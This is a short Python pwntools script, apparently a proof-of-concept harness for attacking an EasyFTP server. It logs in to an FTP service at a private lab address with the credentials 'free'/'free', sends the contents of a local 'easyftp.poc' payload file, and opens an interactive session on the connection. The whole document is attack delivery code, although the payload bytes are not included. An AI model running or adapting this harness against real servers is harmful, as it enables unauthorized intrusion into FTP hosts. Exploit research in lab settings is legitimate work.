#!/usr/bin/python
# -*- coding: UTF-8 -*-

from pwn import *

context.log_level = "debug"
p = remote("192.168.245.135", 21)

p.send("USER free\r\n")

p.recvuntil("free")
p.send("PASS free\r\n")

p.recvuntil("230")

data = ""

with open("sample/ftp/easyftp.poc", "rb") as fp:
    data = fp.read()

p.send(data)

p.interactive()
